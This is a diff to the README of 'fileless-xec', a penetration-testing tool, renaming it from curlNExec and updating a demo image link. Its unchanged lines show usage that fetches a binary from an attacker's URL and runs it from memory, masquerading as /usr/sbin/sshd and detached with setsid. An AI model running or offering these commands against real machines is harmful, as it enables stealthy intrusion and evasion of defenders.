@@ -7,8 +7,6 @@
 
 ***Pentest use:*** `fileless-xec` is used on target machine to stealthy execute a binary file located on attacker machine
 
-*Previously curlNExec, refactor on going*
-
 ## Short story
 
 `fileless-xec` enable us to execute a remote binary on a local machine directly from memory without dropping them on disk
@@ -17,7 +15,7 @@
  - execute binary with specified program name: `fileless-xec -n /usr/sbin/sshd <binary_raw_url>`
  - detach program execution from `tty`: ` setsid fileless-xec [...]` 
 
-![demo](https://github.com/ariary/fileless-xec/blob/main/img/curlNexec.gif)
+![demo](https://github.com/ariary/fileless-xec/blob/main/img/fileless-xec.gif)
 
 <details>
   <summary><b>Explanation</b></summary>
